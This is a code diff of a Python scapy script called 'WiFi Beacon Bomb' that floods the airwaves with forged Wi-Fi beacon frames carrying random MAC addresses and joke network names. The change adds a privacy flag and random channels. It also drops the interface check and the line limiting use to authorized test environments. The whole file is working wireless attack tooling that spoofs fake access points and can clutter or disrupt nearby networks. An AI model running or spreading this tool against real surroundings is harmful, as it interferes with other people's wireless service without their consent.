@@ -1,18 +1,11 @@
-#!/usr/bin/env python3
 import os
 import sys
 import time
+import random
 import argparse
-import random as rand
-from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, get_if_list  # type: ignore
+from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
 
-
-DEFAULT_IFACE = os.environ.get("WIFI_BOMB_IFACE", "wlan0mon")
-DEFAULT_TOTAL = int(os.environ.get("WIFI_BOMB_TOTAL", "1000"))
-DEFAULT_INTERVAL = float(os.environ.get("WIFI_BOMB_INTERVAL", "0.005"))
-
-# Sadece İngilizce komik SSID listesi
-FUNNY_SSIDS = [
+SSID_LIST = [
     "Searching...",
     "Loading_WiFi_99%",
     "Get_Your_Own_WiFi",
@@ -35,82 +28,58 @@ FUNNY_SSIDS = [
     "gameover_zeus_network"
 ]
 
+DEFAULT_IFACE = os.getenv("WIFI_BOMB_IFACE", "wlan0mon")
+DEFAULT_TOTAL = int(os.getenv("WIFI_BOMB_TOTAL", "1000"))
+DEFAULT_INTERVAL = float(os.getenv("WIFI_BOMB_INTERVAL", "0.005"))
 
-def iface_exists(iface: str) -> bool:
-    try:
-        return iface in get_if_list()
-    except Exception:
-        return False
+def generate_random_mac():
+    bytes_list = [0x02, random.randint(0x00, 0x7f), random.randint(0x00, 0xff),
+                  random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
+    return ":".join(f"{b:02x}" for b in bytes_list)
 
+def build_beacon_frame(ssid, mac):
+    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
+    beacon = Dot11Beacon(cap="ESS+privacy")
+    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
+    dsset = Dot11Elt(ID="DSset", info=bytes([random.randint(1, 13)]))
+    return RadioTap() / dot11 / beacon / essid / rates / dsset
 
-def random_mac() -> str:
-    # Locally administered MAC: first byte = 02
-    return "02:00:00:{:02x}:{:02x}:{:02x}".format(
-        rand.randint(0, 255), rand.randint(0, 255), rand.randint(0, 255)
-    )
-
-
-def make_beacon(ssid: str, mac: str):
-    return (
-        RadioTap()
-        / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
-        / Dot11Beacon(cap="ESS")
-        / Dot11Elt(ID="SSID", info=ssid)
-    )
-
-
-def parse_args() -> argparse.Namespace:
-    p = argparse.ArgumentParser(description="Wi‑Fi Beacon Bomb - fake AP beacon broadcaster (use responsibly)")
-    p.add_argument("--iface", default=DEFAULT_IFACE, help="monitor-mode interface to use (env: WIFI_BOMB_IFACE)")
-    p.add_argument("--total", type=int, default=DEFAULT_TOTAL, help="number of fake APs per cycle (env: WIFI_BOMB_TOTAL)")
-    p.add_argument("--interval", type=float, default=DEFAULT_INTERVAL, help="seconds between packets (env: WIFI_BOMB_INTERVAL)")
-    p.add_argument("--simulate", action="store_true", help="simulate only; do not transmit packets")
-    p.add_argument("--verbose", action="store_true", help="print per-packet info to stdout")
-    return p.parse_args()
-
+def parse_args():
+    parser = argparse.ArgumentParser(description="WiFi Beacon Bomb Core Engine")
+    parser.add_argument("--iface", default=DEFAULT_IFACE, help="Monitor mode interface")
+    parser.add_argument("--total", type=int, default=DEFAULT_TOTAL, help="Number of fake APs per cycle")
+    parser.add_argument("--interval", type=float, default=DEFAULT_INTERVAL, help="Seconds between packets")
+    parser.add_argument("--simulate", action="store_true", help="Simulate without transmitting packets")
+    parser.add_argument("--verbose", action="store_true", help="Print per-packet info to stdout")
+    return parser.parse_args()
 
 def main():
     args = parse_args()
-    iface = args.iface
-    total = args.total
-    interval = args.interval
-    simulate = args.simulate
-    verbose = args.verbose
+    print(f"[+] Starting Beacon Bomb Core")
+    print(f"[+] Interface: {args.iface} | Total: {args.total} | Interval: {args.interval}s | Simulate: {args.simulate}")
 
-    if not simulate and not iface_exists(iface):
-        print(f"[!] Interface {iface} not found. Available interfaces: {get_if_list()}")
-        sys.exit(1)
-
-    print(f"[*] Starting Wi‑Fi Beacon Bomb on interface={iface} total={total} interval={interval}s simulate={simulate}")
-    print("[!] Use only in authorized test environments. The author is not responsible for misuse.")
-
-    counter = 0
+    sent_count = 0
     try:
         while True:
-            for i in range(total):
-                # Sırayla listedeki komik isimleri döner
-                ssid = FUNNY_SSIDS[i % len(FUNNY_SSIDS)]
-                mac = random_mac()
-                pkt = make_beacon(ssid, mac)
+            for i in range(args.total):
+                ssid = random.choice(SSID_LIST)
+                mac = generate_random_mac()
+                pkt = build_beacon_frame(ssid, mac)
 
-                if simulate:
-                    if verbose:
-                        print(f"[SIM] would send SSID={ssid} BSSID={mac}")
-                else:
-                    sendp(pkt, iface=iface, count=1, verbose=False)
-                    if verbose:
-                        print(f"[TX ] sent SSID={ssid} BSSID={mac}")
+                if not args.simulate:
+                    sendp(pkt, iface=args.iface, count=1, verbose=False)
 
-                counter += 1
-                if interval > 0:
-                    time.sleep(interval)
+                sent_count += 1
+
+                if args.verbose:
+                    print(f"[{sent_count}] Broadcast SSID: {ssid} ({mac}) on {args.iface}")
+
+                time.sleep(args.interval)
 
     except KeyboardInterrupt:
-        print("\n[+] Stopped by user (KeyboardInterrupt). Exiting cleanly.")
-    except Exception as e:
-        print(f"[!] Unexpected error: {e}", file=sys.stderr)
-        raise
-
+        print("\n[-] Beacon Bomb stopped by user.")
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
